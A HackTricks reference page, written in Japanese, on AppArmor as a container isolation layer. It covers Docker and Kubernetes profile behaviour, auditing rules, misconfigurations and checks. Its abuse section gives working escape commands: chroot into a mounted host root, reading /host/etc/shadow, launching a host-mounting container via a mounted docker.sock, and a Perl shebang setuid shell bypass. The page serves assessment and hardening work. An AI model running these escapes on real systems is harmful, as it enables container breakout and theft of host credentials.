# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

AppArmor は、プログラムごとの profile を通じて制限を適用する **Mandatory Access Control** システムです。ユーザーやグループの所有権に大きく依存する従来の DAC チェックとは異なり、AppArmor ではプロセス自体に関連付けられたポリシーを kernel が適用します。container 環境では、workload がある操作を試みるのに十分な従来の権限を持っていても、AppArmor profile が対象の path、mount、network 動作、または capability の使用を許可していないために拒否される可能性があります。

最も重要な概念は、AppArmor が **path-based** であることです。SELinux のように label を使用するのではなく、path rule によって filesystem access を判断します。そのため扱いやすく強力ですが、bind mount や別の path 構成には注意が必要です。同じ host content が別の path から到達可能になると、ポリシーの効果が operator の最初の想定と異なる場合があります。

## Container Isolation における役割

Container security review では capabilities と seccomp の確認で終わることが多いですが、AppArmor はそれらのチェック後も重要です。想定以上の privilege を持つ container や、運用上の理由から追加の capability が必要な workload を考えてみてください。AppArmor は、file access、mount 動作、networking、execution pattern を引き続き制限し、明らかな abuse path を阻止できます。そのため、「application を動作させるためだけ」に AppArmor を無効化すると、単にリスクのある構成が、実際に exploit 可能な構成へと静かに変わる可能性があります。

## Lab

host で AppArmor が有効かどうかを確認するには、次を使用します。
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
現在のコンテナプロセスがどのユーザーとして実行されているかを確認するには：
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
この違いは重要です。通常の場合、プロセスには runtime によって選択された profile に紐づく AppArmor context が表示されるはずです。unconfined の場合、この追加の制限レイヤーはなくなります。

Docker が適用したと認識している内容も確認できます：
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Dockerは、hostがサポートしている場合、defaultまたはcustomのAppArmor profileを適用できます。PodmanもAppArmorベースのsystemでAppArmorと統合できますが、SELinux-firstのdistributionでは、通常もう一方のMAC systemが中心的な役割を担います。Kubernetesは、実際にAppArmorをサポートしているnode上で、workload levelのAppArmor policyを公開できます。LXCおよび関連するUbuntu-familyのsystem-container環境でも、AppArmorは広く使用されています。

実際に重要なのは、AppArmorが「Dockerのfeature」ではないという点です。これはhost kernelのfeatureであり、複数のruntimeが適用を選択できます。hostがAppArmorをサポートしていない場合、またはruntimeにunconfinedで実行するよう指定されている場合、想定されているprotectionは実際には存在しません。

Kubernetesでは、modern APIは`securityContext.appArmorProfile`です。Kubernetes `v1.30`以降、古いbeta AppArmor annotationはdeprecatedです。サポートされているhostでは、`RuntimeDefault`がdefault profileであり、`Localhost`はnode上ですでにloadされている必要があるprofileを指します。これはreview時に重要です。manifestがAppArmorに対応しているように見えても、実際にはnode側のsupportとpreloaded profileに完全に依存している可能性があるためです。<sup>[[1]](#references)</sup>

微妙ですが有用な運用上のdetailとして、`appArmorProfile.type: RuntimeDefault`を明示的に設定することは、単にfieldを省略するよりstrictです。fieldを明示的に設定し、nodeがAppArmorをサポートしていない場合、admissionは失敗するはずです。fieldを省略すると、workloadはAppArmorのないnode上でも実行され、その追加のconfinement layerを受けない可能性があります。attackerの観点では、manifestと実際のnode stateの両方を確認するよい理由になります。<sup>[[1]](#references)</sup>

AppArmorを利用可能なDocker hostでは、最もよく知られているdefaultは`docker-default`です。このprofileはMobyのAppArmor templateから生成されます。これは、capabilityベースの一部のPoCがdefault container内でも失敗する理由を説明するうえで重要です。大まかに言えば、`docker-default`は通常のnetworkingを許可し、`/proc`の広範な範囲へのwriteをdenyし、`/sys`のsensitiveな部分へのaccessをdenyし、mount operationをblockし、ptraceを制限することで、一般的なhost-probing primitiveとして使えないようにします。このbaselineを理解すると、「containerが`CAP_SYS_ADMIN`を持っている」ことと、「containerがkernel interfaceに対して、そのcapabilityを実際に使用できる」ことを区別しやすくなります。

## Profile Management

AppArmor profileは通常、`/etc/apparmor.d/`配下に保存されます。一般的なnaming conventionでは、executable path内のslashをdotに置き換えます。たとえば、`/usr/bin/man`用のprofileは、通常`/etc/apparmor.d/usr.bin.man`として保存されます。このdetailはdefenseとassessmentの両方で重要です。activeなprofile nameがわかれば、host上で対応するfileをすぐに見つけられることが多いためです。

host側で使用できる管理commandには、次のものがあります。
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
コンテナ security のリファレンスでこれらのコマンドが重要なのは、profile が実際にどのように構築、load、complain mode への切り替え、アプリケーションの変更後に修正されるのかを説明しているためです。operator が troubleshooting 中に profile を complain mode に移行し、enforcement への復元を忘れる習慣がある場合、documentation 上では container が保護されているように見えても、実際にははるかに緩い状態で動作する可能性があります。

### Profile の構築と更新

`aa-genprof` はアプリケーションの動作を監視し、interactive に profile を生成する手助けをします：
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` は、後で `apparmor_parser` を使用して読み込めるテンプレートプロファイルを生成できます。
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
バイナリが変更され、policyの更新が必要になった場合、`aa-logprof`はログ内で見つかったdenialを再現し、operatorがallowまたはdenyのいずれかを判断するのを支援できます。
```bash
sudo aa-logprof
```
### Logs

AppArmor の拒否は、`auditd`、syslog、または `aa-notify` などのツールを通じて確認できることが多いです：
```bash
sudo aa-notify -s 1 -v
```
これは運用面でも攻撃面でも有用です。Defenders はこれを使用して profiles を改良します。Attackers は、どの exact path または operation が拒否されているのか、また exploit chain をブロックしている control が AppArmor なのかを把握するために使用します。

### Exact Profile File の特定

runtime が container に対して特定の AppArmor profile name を表示した場合、その name をディスク上の profile file に対応付けると役立つことがあります。
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
これは特に host-side review で有用です。`container` が profile `lowpriv` の下で実行されていると示す情報と、audit や reload が可能な実際のルールが存在する特定のファイルとの間の隔たりを埋められるためです。

### Audit すべき High-Signal Rules

profile を読める場合、単純な `deny` 行だけで終わらせないでください。複数の rule type が、container escape attempt に対して AppArmor がどれだけ有効かを大きく左右します。<sup>[[2]](#references)</sup>

- `ux` / `Ux`: target binary を unconfined で execute します。到達可能な helper、shell、interpreter が `ux` の下で許可されている場合、通常は最初に test すべき対象です。
- `px` / `Px` および `cx` / `Cx`: exec 時に profile transition を実行します。これらは自動的に悪いわけではありませんが、現在の profile よりも大幅に広い profile に transition する可能性があるため、audit する価値があります。
- `change_profile`: task が別の loaded profile に即座に、または次回の exec 時に switch することを許可します。移行先の profile が弱い場合、これは restrictive domain から脱出するための意図された escape hatch になり得ます。
- `flags=(complain)`、`flags=(unconfined)`、または新しい `flags=(prompt)`: これらは profile に置く trust の度合いを変えるべき要素です。`complain` は denial を enforce せずに log し、`unconfined` は boundary を削除し、`prompt` は kernel による純粋な deny ではなく userspace の decision path に依存します。
- `userns` または `userns create,`: 新しい AppArmor policy では user namespace の作成を mediate できます。container profile が明示的にこれを許可している場合、platform が hardening strategy の一部として AppArmor を使用していても、nested user namespace は引き続き利用可能です。

Useful host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
この種の audit は、何百もの通常の file rule を眺めるよりも有用なことがよくあります。breakout が helper の実行、新しい namespace への移行、またはより制限の緩い profile への脱出に依存している場合、その答えは明白な `deny /etc/shadow r` 形式の行ではなく、こうした transition 指向の rule に隠れていることがよくあります。

## Misconfigurations

最も明白なミスは `apparmor=unconfined` です。管理者は、profile が危険または想定外の何かを正しくブロックしたために失敗した application を debug する際、この設定を行うことがよくあります。この flag が production に残っていると、MAC layer 全体が事実上削除されたことになります。

もう1つの微妙な問題は、file permissions が正常に見えるため、bind mounts は無害だと思い込むことです。AppArmor は path-based なので、alternate mount locations 配下で host paths を公開すると、path rules と悪い形で相互作用する可能性があります。3つ目のミスは、config file 内の profile name は、host kernel が実際に AppArmor を enforcing していなければ、ほとんど意味を持たないことを忘れることです。

## Abuse

AppArmor がなくなると、以前は制限されていた operation が突然機能する可能性があります。たとえば、bind mounts 経由で sensitive paths を読み取ること、より利用しにくい状態にしておくべき procfs や sysfs の一部にアクセスすること、capabilities/seccomp も許可していれば mount 関連の action を実行すること、または profile が通常 deny する paths を使用することなどです。AppArmor は、capability-based breakout の試行が理論上は「should work」するはずなのに、実際には失敗する理由を説明する mechanism であることがよくあります。AppArmor を削除すると、同じ試行が成功し始める可能性があります。

AppArmor が path-traversal、bind-mount、または mount-based abuse chain を阻止している主な要因だと疑う場合、通常の最初の step は、profile の有無によって何が accessible になるかを比較することです。たとえば、host path が container 内に mount されている場合、まずその path を traverse して read できるか確認します。
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
コンテナに `CAP_SYS_ADMIN` のような危険な capability もある場合、最も実用的なテストの一つは、AppArmor が mount operations や機密性の高い kernel filesystems へのアクセスをブロックしている制御かどうかを確認することです。
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
ホストパスがすでに bind mount を通じて利用可能な環境では、AppArmor を失うことで、読み取り専用の情報漏えい問題がホストファイルへの直接アクセスに変わる可能性もあります：
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
これらのコマンドの要点は、AppArmor 単独で breakout が発生するということではありません。AppArmor が削除されると、多くの filesystem および mount ベースの abuse パスを直ちにテストできるようになるということです。

### Full Example: AppArmor Disabled + Host Root Mounted

コンテナにすでにホストの root が `/host` に bind-mounted されている場合、AppArmor を削除することで、ブロックされていた filesystem abuse パスが完全な host escape につながる可能性があります。
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
シェルがホストファイルシステムを通じて実行されると、workload は事実上コンテナの境界から脱出したことになります:
```bash
id
hostname
cat /etc/shadow | head
```
### 完全な例: AppArmor 無効化 + Runtime Socket

実際の障壁が runtime state 周辺の AppArmor だった場合、完全な escape には socket の mount だけで十分なことがあります：
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
パスの正確な位置は mount point によって異なりますが、最終的な結果は同じです。AppArmor は runtime API へのアクセスをもはや防止できず、runtime API によって host を侵害可能な container を起動できます。

### Full Example: Path-Based Bind-Mount Bypass

AppArmor はパスベースであるため、`/proc/**` を保護しても、別のパスを通じて到達可能な同じ host の procfs コンテンツが自動的に保護されるわけではありません。
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
影響は、何が実際に mount されているか、また代替パスが他の controls も bypass するかどうかによって異なります。しかし、このパターンは、AppArmor を単独ではなく mount layout と併せて評価する必要がある最も明確な理由の 1 つです。

### 完全な例: Shebang Bypass

AppArmor policy は、shebang 処理を介した script の実行を十分に考慮せず、interpreter のパスを対象にすることがあります。歴史的な例として、1 行目が confined interpreter を指す script を使用する方法がありました:<sup>[[3]](#references)</sup>
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
この種の例は、profile の意図と実際の実行セマンティクスが乖離する可能性があることを思い出させる重要なものです。container 環境で AppArmor をレビューする際は、interpreter chain と代替の実行経路に特に注意する必要があります。

## Checks

これらの Checks の目的は、次の3つの質問に迅速に答えることです。host で AppArmor が有効になっているか、現在の process が制限下にあるか、そして runtime が実際にこの container に profile を適用したか。
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
ここで注目すべき点：

- `/proc/self/attr/current` に `unconfined` と表示される場合、workload は AppArmor の confinement の恩恵を受けていません。
- `aa-status` に AppArmor が disabled または not loaded と表示される場合、runtime config に profile name があっても、ほとんど cosmetic です。
- `docker inspect` に `unconfined` または予期しない custom profile が表示される場合、filesystem または mount-based abuse path が機能する理由は、多くの場合そこにあります。
- `/sys/kernel/security/apparmor/profiles` に想定した profile が含まれていない場合、runtime または orchestrator の設定だけでは不十分です。
- 強化されたはずの profile に `ux`、広範な `change_profile`、`userns`、または `flags=(complain)` 形式の rule が含まれている場合、実際の boundary は profile name が示すよりもはるかに弱い可能性があります。

container が運用上の理由ですでに elevated privileges を持っている場合、AppArmor を有効にしたままにすることで、controlled exception と、はるかに広範な security failure の違いが生じることがあります。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | AppArmor 対応 host ではデフォルトで Enabled | override されない限り `docker-default` AppArmor profile を使用 | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Podman | Host に依存 | AppArmor は `--security-opt` 経由でサポートされますが、正確な default は host/runtime に依存し、Docker の文書化された `docker-default` profile ほど universal ではありません | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Kubernetes | Conditional default | `appArmorProfile.type` が指定されていない場合、default は `RuntimeDefault` ですが、node で AppArmor が有効な場合にのみ適用されます | `securityContext.appArmorProfile.type: Unconfined`、弱い profile を指定した `securityContext.appArmorProfile.type: Localhost`、AppArmor をサポートしない node |
| containerd / CRI-O under Kubernetes | Node/runtime support に従う | Kubernetes がサポートする一般的な runtime は AppArmor をサポートしますが、実際の enforcement は node support と workload settings に依存します | Kubernetes の行と同じ。direct runtime configuration によって AppArmor を完全に skip することも可能 |

AppArmor では、最も重要な variable は runtime だけでなく、**host** であることがよくあります。manifest 内の profile setting は、AppArmor が有効になっていない node 上に confinement を作成しません。

## References

- [1] [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [HTB: Nunchucks - AppArmor shebang bypass with a Perl script](https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html)

{{#include ../../../../banners/hacktricks-training.md}}
